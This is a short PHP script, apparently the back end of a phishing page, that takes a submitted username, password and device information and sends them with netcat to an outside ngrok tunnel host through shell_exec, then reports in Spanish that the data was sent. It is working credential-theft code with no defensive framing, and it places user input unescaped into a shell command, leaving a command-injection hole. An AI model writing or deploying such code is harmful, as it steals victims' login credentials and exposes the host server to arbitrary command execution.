<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $device_info = $_POST["device_info"];

    $data = "Username: $username, Password: $password, Device Info: $device_info";

    $command = "echo '$data' | nc 2.tcp.ngrok.io 16227";
    shell_exec($command);

    echo "Datos enviados correctamente.";
}
?>